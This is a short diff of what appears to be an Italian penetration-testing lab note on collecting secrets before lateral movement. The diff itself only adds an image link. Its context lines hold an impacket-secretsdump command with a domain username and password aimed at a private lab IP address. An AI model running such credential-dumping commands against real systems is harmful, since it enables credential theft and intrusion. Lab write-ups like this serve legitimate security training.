@@ -4,3 +4,4 @@ Prima di saltare da una macchina all'altra è essenziale ottenere tutti i "Secre
 ```bash
 impacket-secretsdump NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
 ```
+![[Pasted image 20230906162707.png]]
